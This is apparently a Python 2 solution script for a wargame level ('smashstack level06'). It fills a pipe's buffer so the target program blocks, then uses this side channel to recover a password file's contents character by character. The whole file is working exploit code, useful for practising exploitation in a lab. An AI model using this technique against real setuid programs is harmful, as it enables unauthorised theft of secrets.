import os
import time
import pprint
import subprocess
import sys
import string
import signal

charset = string.ascii_letters + string.digits
junk = ''.join([`num` for num in xrange(20)])

welcome_message = "Welcome to the password checker!\n"

# Check the last character in the passed in string to see if it is valid. Assumes all the characters before the
# last one are already valid
def check_validity( guess ):

  r, w = os.pipe()

  echo_read, echo_write = os.pipe()

  # Fill up the write buffer to cause the program to block on an fprintf

  bytes_to_block = 65536 - len(welcome_message) - len(guess)

  for i in range(0, bytes_to_block ):
    os.write(w, "A")

  child = os.fork()

  #child = 0
  if( child == 0 ):
    os.dup2(echo_write, 1)
    os.dup2(w, 2)
    #os.execv("/levels/level06", ["/levels/level06", "/home/the-flag/.password", "%s%s" % (guess, junk)])
    os.execv("/home/zemmekkis/smashstack/level06", ["/home/zemmekkis/smashstack/level06", "password", "%s%s" % (guess, junk)])
  else:
    output = ""
    def set_output(signum, frame):
      pass

    TIMEOUT = 2
    signal.alarm(TIMEOUT)
    signal.signal(signal.SIGALRM, set_output)

    try:
      output = os.read(echo_read, 2)
    except:
      pass
    os.close(r)
    os.close(w)
    os.close(echo_read)
    os.close(echo_write)
    if( output.find("Ha") >= 0 ):
      return False
    else:
      return True



def find_password():

  password = ""
  while( True ):

    possible_chars = list(charset)

    for char in possible_chars[:]:

      # Remove the character if it is not valid
      if( check_validity(password + char) == False ):
        possible_chars.remove(char)

    if( len(possible_chars) == 1 ):  
      password = password + possible_chars[0]
      print password
    if( len(possible_chars) > 1 ):
      print possible_chars
      print "Could not determine the correct character"
      sys.exit(1)
    if( len(possible_chars) == 0):
      return password

password = find_password()

print "Most likely password: %s" % password
